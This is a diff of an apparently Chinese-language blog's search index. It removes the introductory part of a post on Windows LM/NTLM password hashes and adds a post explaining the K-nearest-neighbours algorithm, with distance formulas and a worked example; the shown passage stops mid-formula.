@@ -129,6 +129,9 @@
 
 <p><img src="/2021/07/21/CVE-2020-1472-Netlogon%E5%9F%9F%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E/7.png"></p>
 ]]></content>
+      <categories>
+        <category>渗透测试</category>
+      </categories>
       <tags>
         <tag>渗透测试</tag>
         <tag>漏洞复现</tag>
@@ -208,191 +211,175 @@
       </tags>
   </entry>
   <entry>
-    <title>Windows密码凭证获取</title>
-    <url>/2021/03/04/Windows%E5%AF%86%E7%A0%81%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/</url>
-    <content><![CDATA[<h3 id="成殇Orz1"><a href="#成殇Orz1" class="headerlink" title="成殇Orz1"></a>成殇Orz1</h3><h3 id="0x00-Windows-Hash简介"><a href="#0x00-Windows-Hash简介" class="headerlink" title="0x00  Windows Hash简介"></a>0x00  Windows Hash简介</h3><h4 id="Windows-Hash"><a href="#Windows-Hash" class="headerlink" title="Windows Hash"></a>Windows Hash</h4><p>所谓哈希（hash），就是使用一种加密函数进行计算后的结果。这个加密函数对一个任意长度的字符串数据进行一 次数学加密函数运算，然后返回一个固定长度的字符串。 现在已经有了更新的NTLMv2以及Kerberos验证体系。</p>
-<p>Windows系统使用两种方法对用户的密码进行哈希处理，它们分别是LAN Manager（LM）哈希和NT LAN Manager（NTLM）哈希Windows加密过的密码口令，我们称之为hash，Windows的系统密码hash默认情况下一般由两部分组成：第一 部分是LM-hash，第二部分是NTLM-hash。</p>
+    <title>K近邻算法（KNN）</title>
+    <url>/2021/12/31/K%E8%BF%91%E9%82%BB%E7%AE%97%E6%B3%95%EF%BC%88KNN%EF%BC%89/</url>
+    <content><![CDATA[<h1 id="K近邻算法"><a href="#K近邻算法" class="headerlink" title="K近邻算法"></a>K近邻算法</h1><h4 id="成殇Orz1"><a href="#成殇Orz1" class="headerlink" title="成殇Orz1"></a>成殇Orz1</h4><h3 id="0x00-工作原理"><a href="#0x00-工作原理" class="headerlink" title="0x00 工作原理"></a>0x00 工作原理</h3><p>给定一个样本集，并且其中每一个样本都设定特征值，并事先给定标签。输入新数据时，将新数据的特征值与样本数据中的进行对比，计算未标记样本和数据集中每个样本的距离，取其距离最近的K个样本。此时，新数据的分类便从这K个距离最近的样本投票产生。</p>
+<p>核心思想是如果一个样本在特征空间中的k个最相邻的样本中的大多数属于某一个类别，则针对该样本的划分结果也属于这个类别。</p>
 <span id="more"></span>
 
-<p>Windows Hash格式：</p>
-<figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line">用户名称<span class="symbol">:RID</span><span class="symbol">:LM-HASH</span>值<span class="symbol">:NT-HASH</span>值</span><br></pre></td></tr></table></figure>
-
-<p>LM哈希密码最大长度为14，密码长度超过14位使用NTLM哈希</p>
+<h3 id="0x01-示例"><a href="#0x01-示例" class="headerlink" title="0x01 示例"></a>0x01 示例</h3><p>如下图所示，判断项目五能否成功</p>
 <table>
 <thead>
 <tr>
-<th></th>
-<th>2000</th>
-<th>xp</th>
-<th>2003</th>
-<th>Vista</th>
-<th>win7</th>
-<th>2008</th>
-<th>2012</th>
+<th>名称</th>
+<th>资金（W）</th>
+<th>人员数量</th>
+<th>分类</th>
 </tr>
 </thead>
 <tbody><tr>
-<td>LM</td>
-<td>√</td>
-<td>√</td>
-<td>√</td>
-<td></td>
-<td></td>
-<td></td>
-<td></td>
+<td>项目一</td>
+<td>80</td>
+<td>13</td>
+<td>成功</td>
 </tr>
 <tr>
-<td>NTLM</td>
-<td>√</td>
-<td>√</td>
-<td>√</td>
-<td>√</td>
-<td>√</td>
-<td>√</td>
-<td>√</td>
+<td>项目二</td>
+<td>10</td>
+<td>2</td>
+<td>失败</td>
+</tr>
+<tr>
+<td>项目三</td>
+<td>30</td>
+<td>1</td>
+<td>失败</td>
+</tr>
+<tr>
+<td>项目四</td>
+<td>50</td>
+<td>8</td>
+<td>成功</td>
+</tr>
+<tr>
+<td>项目五</td>
+<td>60</td>
+<td>7</td>
+<td>？</td>
 </tr>
 </tbody></table>
-<h4 id="Windows-认证基础"><a href="#Windows-认证基础" class="headerlink" title="Windows 认证基础"></a>Windows 认证基础</h4><p>Windows的认证包括三个部分： </p>
-<ul>
-<li><p>本地认证：用户直接操作计算机登陆账户 </p>
+<p>按照KNN算法的原理，我们可以先将前面四个数据作为样本集，建立坐标系，其中将资金定义为X轴，人员数量定义为Y轴，可以画出以下坐标系</p>
+<p><img src="/2021/12/31/K%E8%BF%91%E9%82%BB%E7%AE%97%E6%B3%95%EF%BC%88KNN%EF%BC%89/1.png"></p>
+<p>​    其中，蓝色为成功的项目，黑色时失败的项目，红色为我们需要判断的项目，我们可以凭借肉眼看出，红色很靠近蓝色成功项目，但实际我们需要数学公式进行检测</p>
+<p>欧式距离公式</p>
+<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">∣</mi><mi>A</mi><msub><mi>B</mi><mi>i</mi></msub><mi mathvariant="normal">∣</mi><mo>=</mo><msqrt><mrow><mo stretchy="false">(</mo><mi>x</mi><mo>−</mo><msub><mi>x</mi><mi>i</mi></msub><msup><mo stretchy="false">)</mo><mn>2</mn></msup><mo>+</mo><mo stretchy="false">(</mo><mi>y</mi><mo>−</mo><msub><mi>y</mi><mi>i</mi></msub><msup><mo stretchy="false">)</mo><mn>2</mn></msup></mrow></msqrt></mrow><annotation encoding="application/x-tex"> 
+
+|AB_i| = \sqrt{(x-x_i)^2 + (y-y_i)^2}
+</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">∣</span><span class="mord mathnormal">A</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.05017em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord">∣</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.24em;vertical-align:-0.30499999999999994em;"></span><span class="mord sqrt"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.935em;"><span class="svg-align" style="top:-3.2em;"><span class="pstrut" style="height:3.2em;"></span><span class="mord" style="padding-left:1em;"><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.740108em;"><span style="top:-2.9890000000000003em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.740108em;"><span style="top:-2.9890000000000003em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span></span><span style="top:-2.8950000000000005em;"><span class="pstrut" style="height:3.2em;"></span><span class="hide-tail" style="min-width:1.02em;height:1.28em;"><svg width="400em" height="1.28em" viewbox="0 0 400000 1296" preserveaspectratio="xMinYMin slice"><path d="M263,681c0.7,0,18,39.7,52,119
+c34,79.3,68.167,158.7,102.5,238c34.3,79.3,51.8,119.3,52.5,120
+c340,-704.7,510.7,-1060.3,512,-1067
+l0 -0
+c4.7,-7.3,11,-11,19,-11
+H40000v40H1012.3
+s-271.3,567,-271.3,567c-38.7,80.7,-84,175,-136,283c-52,108,-89.167,185.3,-111.5,232
+c-22.3,46.7,-33.8,70.3,-34.5,71c-4.7,4.7,-12.3,7,-23,7s-12,-1,-12,-1
+s-109,-253,-109,-253c-72.7,-168,-109.3,-252,-110,-252c-10.7,8,-22,16.7,-34,26
+c-22,17.3,-33.3,26,-34,26s-26,-26,-26,-26s76,-59,76,-59s76,-60,76,-60z
+M1001 80h400000v40h-400000z"/></svg></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.30499999999999994em;"><span></span></span></span></span></span></span></span></span>
+
+<p>曼哈顿距离公式</p>
+<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">∣</mi><mi>A</mi><msub><mi>B</mi><mi>i</mi></msub><mi mathvariant="normal">∣</mi><mo>=</mo><mi mathvariant="normal">∣</mi><mi>x</mi><mo>−</mo><msub><mi>x</mi><mi>i</mi></msub><mi mathvariant="normal">∣</mi><mo>+</mo><mi mathvariant="normal">∣</mi><mi>y</mi><mo>−</mo><msub><mi>y</mi><mi>i</mi></msub><mi mathvariant="normal">∣</mi></mrow><annotation encoding="application/x-tex"> 
+
+|AB_i| = |x-x_i|+|y-y_i|
+</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">∣</span><span class="mord mathnormal">A</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.05017em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord">∣</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">∣</span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord">∣</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">∣</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord">∣</span></span></span></span>
+
+<p>切比雪夫距离公式</p>
+<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">∣</mi><mi>A</mi><msub><mi>B</mi><mi>i</mi></msub><mi mathvariant="normal">∣</mi><mo>=</mo><mi>m</mi><mi>a</mi><mi>x</mi><mo stretchy="false">(</mo><mi mathvariant="normal">∣</mi><mi>x</mi><mo>−</mo><msub><mi>x</mi><mi>i</mi></msub><mi mathvariant="normal">∣</mi><mo separator="true">,</mo><mi mathvariant="normal">∣</mi><mi>y</mi><mo>−</mo><msub><mi>y</mi><mi>i</mi></msub><mi mathvariant="normal">∣</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex"> 
+
+|AB_i|=max(|x-x_i|,|y-y_i|)
+</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">∣</span><span class="mord mathnormal">A</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.05017em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord">∣</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">m</span><span class="mord mathnormal">a</span><span class="mord mathnormal">x</span><span class="mopen">(</span><span class="mord">∣</span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord">∣</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">∣</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord">∣</span><span class="mclose">)</span></span></span></span>
+
+<p>这里我们用欧式距离公式进行验证，计算红点与每个点之间的距离，将坐标系从左至右分为点</p>
+<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">∣</mi><mi>A</mi><msub><mi>B</mi><mn>1</mn></msub><mi mathvariant="normal">∣</mi><mo>=</mo><msqrt><mrow><mo stretchy="false">(</mo><mn>60</mn><mo>−</mo><mn>10</mn><msup><mo stretchy="false">)</mo><mn>2</mn></msup><mo>+</mo><mo stretchy="false">(</mo><mn>7</mn><mo>−</mo><mn>2</mn><msup><mo stretchy="false">)</mo><mn>2</mn></msup></mrow></msqrt><mo>=</mo><mn>50.2493781056</mn><mspace linebreak="newline"></mspace><mi mathvariant="normal">∣</mi><mi>A</mi><msub><mi>B</mi><mn>2</mn></msub><mi mathvariant="normal">∣</mi><mo>=</mo><msqrt><mrow><mo stretchy="false">(</mo><mn>60</mn><mo>−</mo><mn>30</mn><msup><mo stretchy="false">)</mo><mn>2</mn></msup><mo>+</mo><mo stretchy="false">(</mo><mn>7</mn><mo>−</mo><mn>1</mn><msup><mo stretchy="false">)</mo><mn>2</mn></msup></mrow></msqrt><mo>=</mo><mn>30.5941170815</mn><mspace linebreak="newline"></mspace><mi mathvariant="normal">∣</mi><mi>A</mi><msub><mi>B</mi><mn>3</mn></msub><mi mathvariant="normal">∣</mi><mo>=</mo><msqrt><mrow><mo stretchy="false">(</mo><mn>60</mn><mo>−</mo><mn>50</mn><msup><mo stretchy="false">)</mo><mn>2</mn></msup><mo>+</mo><mo stretchy="false">(</mo><mn>7</mn><mo>−</mo><mn>8</mn><msup><mo stretchy="false">)</mo><mn>2</mn></msup></mrow></msqrt><mo>=</mo><mn>10.0498756211</mn><mspace linebreak="newline"></mspace><mi mathvariant="normal">∣</mi><mi>A</mi><msub><mi>B</mi><mn>4</mn></msub><mi mathvariant="normal">∣</mi><mo>=</mo><msqrt><mrow><mo stretchy="false">(</mo><mn>60</mn><mo>−</mo><mn>80</mn><msup><mo stretchy="false">)</mo><mn>2</mn></msup><mo>+</mo><mo stretchy="false">(</mo><mn>7</mn><mo>−</mo><mn>13</mn><msup><mo stretchy="false">)</mo><mn>2</mn></msup></mrow></msqrt><mo>=</mo><mn>20.880613017</mn><mspace linebreak="newline"></mspace></mrow><annotation encoding="application/x-tex"> 
+
+|AB_1|=\sqrt{(60-10)^2+(7-2)^2}=50.2493781056\\
+		|AB_2|=\sqrt{(60-30)^2+(7-1)^2}=30.5941170815\\
+		|AB_3|=\sqrt{(60-50)^2+(7-8)^2}=10.0498756211\\
+		|AB_4|=\sqrt{(60-80)^2+(7-13)^2}=20.880613017\\
+</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">∣</span><span class="mord mathnormal">A</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.05017em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord">∣</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.24em;vertical-align:-0.30499999999999994em;"></span><span class="mord sqrt"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.935em;"><span class="svg-align" style="top:-3.2em;"><span class="pstrut" style="height:3.2em;"></span><span class="mord" style="padding-left:1em;"><span class="mopen">(</span><span class="mord">6</span><span class="mord">0</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord">1</span><span class="mord">0</span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.740108em;"><span style="top:-2.9890000000000003em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mopen">(</span><span class="mord">7</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord">2</span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.740108em;"><span style="top:-2.9890000000000003em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span></span><span style="top:-2.8950000000000005em;"><span class="pstrut" style="height:3.2em;"></span><span class="hide-tail" style="min-width:1.02em;height:1.28em;"><svg width="400em" height="1.28em" viewbox="0 0 400000 1296" preserveaspectratio="xMinYMin slice"><path d="M263,681c0.7,0,18,39.7,52,119
+c34,79.3,68.167,158.7,102.5,238c34.3,79.3,51.8,119.3,52.5,120
+c340,-704.7,510.7,-1060.3,512,-1067
+l0 -0
+c4.7,-7.3,11,-11,19,-11
+H40000v40H1012.3
+s-271.3,567,-271.3,567c-38.7,80.7,-84,175,-136,283c-52,108,-89.167,185.3,-111.5,232
+c-22.3,46.7,-33.8,70.3,-34.5,71c-4.7,4.7,-12.3,7,-23,7s-12,-1,-12,-1
+s-109,-253,-109,-253c-72.7,-168,-109.3,-252,-110,-252c-10.7,8,-22,16.7,-34,26
+c-22,17.3,-33.3,26,-34,26s-26,-26,-26,-26s76,-59,76,-59s76,-60,76,-60z
+M1001 80h400000v40h-400000z"/></svg></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.30499999999999994em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">5</span><span class="mord">0</span><span class="mord">.</span><span class="mord">2</span><span class="mord">4</span><span class="mord">9</span><span class="mord">3</span><span class="mord">7</span><span class="mord">8</span><span class="mord">1</span><span class="mord">0</span><span class="mord">5</span><span class="mord">6</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">∣</span><span class="mord mathnormal">A</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.05017em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord">∣</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.24em;vertical-align:-0.30499999999999994em;"></span><span class="mord sqrt"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.935em;"><span class="svg-align" style="top:-3.2em;"><span class="pstrut" style="height:3.2em;"></span><span class="mord" style="padding-left:1em;"><span class="mopen">(</span><span class="mord">6</span><span class="mord">0</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord">3</span><span class="mord">0</span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.740108em;"><span style="top:-2.9890000000000003em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mopen">(</span><span class="mord">7</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord">1</span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.740108em;"><span style="top:-2.9890000000000003em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span></span><span style="top:-2.8950000000000005em;"><span class="pstrut" style="height:3.2em;"></span><span class="hide-tail" style="min-width:1.02em;height:1.28em;"><svg width="400em" height="1.28em" viewbox="0 0 400000 1296" preserveaspectratio="xMinYMin slice"><path d="M263,681c0.7,0,18,39.7,52,119
+c34,79.3,68.167,158.7,102.5,238c34.3,79.3,51.8,119.3,52.5,120
+c340,-704.7,510.7,-1060.3,512,-1067
+l0 -0
+c4.7,-7.3,11,-11,19,-11
+H40000v40H1012.3
+s-271.3,567,-271.3,567c-38.7,80.7,-84,175,-136,283c-52,108,-89.167,185.3,-111.5,232
+c-22.3,46.7,-33.8,70.3,-34.5,71c-4.7,4.7,-12.3,7,-23,7s-12,-1,-12,-1
+s-109,-253,-109,-253c-72.7,-168,-109.3,-252,-110,-252c-10.7,8,-22,16.7,-34,26
+c-22,17.3,-33.3,26,-34,26s-26,-26,-26,-26s76,-59,76,-59s76,-60,76,-60z
+M1001 80h400000v40h-400000z"/></svg></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.30499999999999994em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">3</span><span class="mord">0</span><span class="mord">.</span><span class="mord">5</span><span class="mord">9</span><span class="mord">4</span><span class="mord">1</span><span class="mord">1</span><span class="mord">7</span><span class="mord">0</span><span class="mord">8</span><span class="mord">1</span><span class="mord">5</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">∣</span><span class="mord mathnormal">A</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.05017em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord">∣</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.24em;vertical-align:-0.30499999999999994em;"></span><span class="mord sqrt"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.935em;"><span class="svg-align" style="top:-3.2em;"><span class="pstrut" style="height:3.2em;"></span><span class="mord" style="padding-left:1em;"><span class="mopen">(</span><span class="mord">6</span><span class="mord">0</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord">5</span><span class="mord">0</span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.740108em;"><span style="top:-2.9890000000000003em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mopen">(</span><span class="mord">7</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord">8</span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.740108em;"><span style="top:-2.9890000000000003em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord 